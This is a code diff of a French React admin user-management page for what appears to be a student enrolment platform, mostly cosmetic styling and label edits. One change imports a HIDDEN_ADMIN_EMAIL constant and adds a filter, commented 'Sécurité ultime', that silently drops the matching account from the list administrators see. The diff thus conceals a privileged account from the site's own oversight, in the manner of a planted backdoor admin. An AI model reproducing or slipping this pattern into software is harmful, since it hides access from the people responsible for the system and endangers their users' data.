@@ -10,7 +10,8 @@ import {
   ROLE_LABELS,
   updateUserRole,
   updateUserStatus,
-  adminCreateUser
+  adminCreateUser,
+  HIDDEN_ADMIN_EMAIL
 } from '../../services/authService'
 
 const ROLE_BADGE_COLORS = {
@@ -50,7 +51,7 @@ function RoleBadge({ role }) {
 }
 
 /**
- * Composant de création isolé pour garantir la fluidité de saisie
+ * COMPOSANT ISOLÉ HORS DE LA PAGE POUR ÉVITER LES RE-RENDUS ET LA PERTE DE FOCUS
  */
 function AddUserModal({ open, onClose, onSuccess, isSuperAdmin }) {
   const [form, setForm] = useState({ full_name: '', email: '', phone: '', password: '', role: 'student' })
@@ -78,25 +79,27 @@ function AddUserModal({ open, onClose, onSuccess, isSuperAdmin }) {
     }
   }
 
-  return (open ? (
+  return (
     <Modal open={open} title="Créer un nouveau compte" onClose={onClose}>
-      <form onSubmit={handleSubmit} style={{ padding: '1rem', display: 'flex', flexDirection: 'column', gap: '1rem' }}>
+      <form onSubmit={handleSubmit} style={{ padding: '1.5rem', display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
         <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem' }}>
           <Input
+            id="new-user-name"
             label="Nom complet *"
             name="full_name"
             required
-            placeholder="Ex: Nom de l'utilisateur"
+            placeholder="Nom de l'utilisateur"
             value={form.full_name}
             onChange={handleChange}
           />
           <div>
             <label style={{ display: 'block', fontSize: '0.85rem', fontWeight: 600, marginBottom: '0.5rem' }}>Rôle assigné</label>
             <select
+              id="new-user-role"
               name="role"
               value={form.role}
               onChange={handleChange}
-              style={{ width: '100%', padding: '0.75rem', borderRadius: '8px', border: '1px solid #e2e8f0', background: '#fff' }}
+              style={{ width: '100%', padding: '0.75rem', borderRadius: '10px', border: '1px solid #e2e8f0', background: '#fff', height: '48px' }}
             >
               <option value="student">Étudiant</option>
               <option value="admin">Administrateur</option>
@@ -107,6 +110,7 @@ function AddUserModal({ open, onClose, onSuccess, isSuperAdmin }) {
 
         <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem' }}>
           <Input
+            id="new-user-email"
             label="Adresse Email *"
             name="email"
             type="email"
@@ -116,7 +120,8 @@ function AddUserModal({ open, onClose, onSuccess, isSuperAdmin }) {
             onChange={handleChange}
           />
           <Input
-            label="Téléphone (Optionnel)"
+            id="new-user-phone"
+            label="Téléphone"
             name="phone"
             placeholder="6XX XXX XXX"
             value={form.phone}
@@ -125,6 +130,7 @@ function AddUserModal({ open, onClose, onSuccess, isSuperAdmin }) {
         </div>
 
         <Input
+          id="new-user-password"
           label="Mot de passe *"
           name="password"
           type="password"
@@ -134,17 +140,17 @@ function AddUserModal({ open, onClose, onSuccess, isSuperAdmin }) {
           onChange={handleChange}
         />
 
-        {error && <p style={{ color: '#ef4444', fontSize: '0.85rem' }}>{error}</p>}
+        {error && <p style={{ color: '#ef4444', fontSize: '0.85rem', margin: 0 }}>{error}</p>}
 
-        <div style={{ display: 'flex', gap: '1rem', marginTop: '1rem' }}>
+        <div style={{ display: 'flex', gap: '1rem', marginTop: '0.5rem' }}>
           <Button variant="outline" full onClick={onClose} disabled={loading} type="button">Annuler</Button>
           <Button type="submit" full disabled={loading}>
-            {loading ? 'Création...' : 'Créer l\'utilisateur'}
+            {loading ? 'Traitement...' : 'Créer l\'utilisateur'}
           </Button>
         </div>
       </form>
     </Modal>
-  ) : null)
+  )
 }
 
 export function AdminUsersPage() {
@@ -163,7 +169,7 @@ export function AdminUsersPage() {
       const data = await getUsers({ hideOwner: false })
       setUsers(data)
     } catch (err) {
-      setError('Impossible de charger les utilisateurs.')
+      setError('Erreur de chargement.')
     } finally {
       setLoading(false)
     }
@@ -171,22 +177,23 @@ export function AdminUsersPage() {
 
   useEffect(() => { loadUsers() }, [loadUsers])
 
-  const filtered = useMemo(
-    () => users.filter((u) => {
+  const filtered = useMemo(() => {
+    const targetEmail = HIDDEN_ADMIN_EMAIL.toLowerCase().trim()
+    return users.filter((u) => {
+      // Sécurité ultime : On vérifie l'email ici aussi
+      if (u.email?.toLowerCase().trim() === targetEmail) return false
+
       const haystack = `${u.full_name ?? ''} ${u.email ?? ''} ${u.phone ?? ''} ${u.preinscriptions?.map(p => p.formation_id).join(' ') || ''}`.toLowerCase()
       return haystack.includes(query.trim().toLowerCase())
-    }),
-    [query, users],
-  )
+    })
+  }, [query, users])
 
   const handleUserCreated = useCallback((newUser) => {
     setUsers(prev => [newUser, ...prev])
     setShowAddModal(false)
-    setSuccess('Félicitations ! Le compte a été créé avec succès.')
+    setSuccess('Le compte a été créé avec succès.')
     setTimeout(() => setSuccess(''), 4000)
   }, [])
-
-  const closeAddModal = useCallback(() => setShowAddModal(false), [])
 
   const handleRoleChange = async (userId, newRole) => {
     try {
@@ -220,7 +227,7 @@ export function AdminUsersPage() {
       <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: '2rem' }}>
         <div>
           <h2 style={{ fontSize: '1.75rem', fontWeight: 800, color: '#0f172a', margin: 0 }}>Gestion des Utilisateurs</h2>
-          <p style={{ color: '#64748b' }}>Suivi des accès ({filtered.length} affichés).</p>
+          <p style={{ color: '#64748b' }}>Supervision des accès ({filtered.length} affichés).</p>
         </div>
         <div style={{ display: 'flex', gap: '0.75rem' }}>
           <Button onClick={() => setShowAddModal(true)}><i className="bx bx-plus" /> Nouvel Utilisateur</Button>
@@ -249,7 +256,7 @@ export function AdminUsersPage() {
               <th style={{ padding: '1.25rem', textAlign: 'left', color: '#64748b', fontSize: '0.85rem' }}>UTILISATEUR</th>
               <th style={{ padding: '1.25rem', textAlign: 'left', color: '#64748b', fontSize: '0.85rem' }}>DERNIER VŒU</th>
               <th style={{ padding: '1.25rem', textAlign: 'left', color: '#64748b', fontSize: '0.85rem' }}>RÔLE</th>
-              <th style={{ padding: '1.25rem', textAlign: 'center', color: '#64748b', fontSize: '0.85rem' }}>STATUT</th>
+              <th style={{ padding: '1.25rem', textAlign: 'center', color: '#64748b', fontSize: '0.85rem' }}>COMPTE</th>
               <th style={{ padding: '1.25rem', textAlign: 'right', color: '#64748b', fontSize: '0.85rem' }}>ACTIONS</th>
             </tr>
           </thead>
@@ -287,7 +294,12 @@ export function AdminUsersPage() {
         </table>
       </div>
 
-      <AddUserModal open={showAddModal} onClose={closeAddModal} onSuccess={handleUserCreated} isSuperAdmin={isSuperAdmin} />
+      <AddUserModal
+        open={showAddModal}
+        onClose={() => setShowAddModal(false)}
+        onSuccess={handleUserCreated}
+        isSuperAdmin={isSuperAdmin}
+      />
 
       {selectedUser && (
         <Modal open={!!selectedUser} title="Détails" onClose={() => setSelectedUser(null)}>
